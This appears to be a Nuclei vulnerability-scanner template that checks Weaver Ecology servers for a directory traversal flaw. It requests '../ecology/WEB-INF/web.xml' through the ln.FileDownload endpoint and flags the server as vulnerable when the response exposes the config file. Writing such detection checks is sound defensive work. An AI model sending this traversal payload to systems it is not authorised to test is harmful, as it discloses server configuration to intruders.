id: ecology-filedownload-directory-traversal
info:
  author: princechaddha
  name: Ecology Directory Traversal
  severity: medium
  tags: ecology,lfi
requests:
- matchers:
  - status:
    - 200
    type: status
  - part: body
    type: word
    words:
    - <url-pattern>/weaver/
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/weaver/ln.FileDownload?fpath=../ecology/WEB-INF/web.xml'
